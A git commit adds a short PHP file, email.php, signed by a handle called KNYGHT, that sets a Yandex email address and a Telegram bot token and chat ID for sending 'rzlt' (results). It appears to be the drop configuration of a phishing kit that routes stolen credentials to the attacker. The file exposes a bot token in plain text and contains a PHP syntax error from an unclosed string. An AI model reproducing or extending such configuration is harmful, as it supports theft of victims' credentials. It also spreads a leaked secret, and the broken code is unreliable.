3d9ec9811f2d3328c129a9026ecb1719b8876571
stytle <108230790+stytle@users.noreply.github.com>
2022-06-26 12:09:59 -0400

    Add files via upload

---
+++ email.php
@@ -0,0 +1,14 @@
+<?php
+/*
+  //||~~ By ~~ KNYGHT ~~\\         			       	                
+ // Telegram Id: @KNYGHT \\	
+*/
+
+$send ="cvicle67@yandex.com; 
+
+//telgram rzlt
+$api = "5252132779:AAHUEJBawGkG95uSg2BYVOOIzCTTlnxxem8";
+$chatid = "1088205830";
+
+
+?>
